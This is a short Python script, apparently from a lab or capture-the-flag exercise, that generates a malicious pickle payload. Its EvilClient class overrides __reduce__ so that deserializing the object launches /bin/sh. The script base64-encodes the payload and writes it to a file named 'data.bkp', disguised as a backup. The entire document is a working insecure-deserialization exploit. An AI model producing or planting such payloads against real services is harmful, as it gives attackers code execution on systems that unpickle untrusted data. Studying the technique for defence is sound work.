#!/usr/bin/env python3

import base64
import pickle
import subprocess


class EvilClient():
    """The evil client will open a shell when it's deserialized!!"""

    def __reduce__(self):
        return (subprocess.Popen, (('/bin/sh',),))


def serialize_data():
    super_secure_data = base64.b64encode(pickle.dumps(EvilClient()))
    with open("data.bkp", "wb") as file:
        file.write(super_secure_data)


if __name__ == '__main__':
    serialize_data()
